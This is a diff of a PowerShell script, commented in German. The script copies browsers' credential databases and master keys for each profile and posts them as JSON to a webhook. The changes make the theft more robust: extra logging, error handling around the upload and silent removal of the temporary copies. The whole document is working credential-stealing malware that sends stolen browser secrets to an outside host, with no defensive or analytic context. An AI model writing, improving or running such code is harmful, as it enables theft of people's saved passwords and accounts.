@@ -22,7 +22,7 @@ function Copy-And-Send {
     # Kopieren der Datenbank und des Masterkeys, um Sperren zu vermeiden
     if (Test-Path $dbPath) {
         Copy-Item $dbPath $tempDb -Force
-        Write-Log "Copied database for $browserName ($profileName)"
+        Write-Log "Copied database for $browserName ($profileName): $dbPath"
     } else {
         Write-Log "Database path not found for $browserName ($profileName): $dbPath"
         return
@@ -30,7 +30,7 @@ function Copy-And-Send {
 
     if (Test-Path $masterKeyPath) {
         Copy-Item $masterKeyPath $tempMasterKey -Force
-        Write-Log "Copied master key for $browserName ($profileName)"
+        Write-Log "Copied master key for $browserName ($profileName): $masterKeyPath"
     } else {
         Write-Log "Master key path not found for $browserName ($profileName): $masterKeyPath"
         return
@@ -46,18 +46,22 @@ function Copy-And-Send {
 
     # Daten an Webhook senden
     $Parameters = @{
-        "Uri"         = $whuri
+        "Uri"         = $webhookUri
         "Method"      = "POST"
         "Body"        = $JsonPayload
         "ContentType" = "application/json"
     }
 
-    Invoke-RestMethod @Parameters
-    Write-Log "Sent data for $browserName ($profileName)"
+    try {
+        Invoke-RestMethod @Parameters
+        Write-Log "Sent data for $browserName ($profileName)"
+    } catch {
+        Write-Log "Failed to send data for $browserName ($profileName): $_"
+    }
 
     # Temporäre Dateien löschen
-    Remove-Item $tempDb -Force
-    Remove-Item $tempMasterKey -Force
+    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+    Remove-Item $tempMasterKey -Force -ErrorAction SilentlyContinue
 }
 
 # Pfade der Browser-Datenbanken und Masterkeys
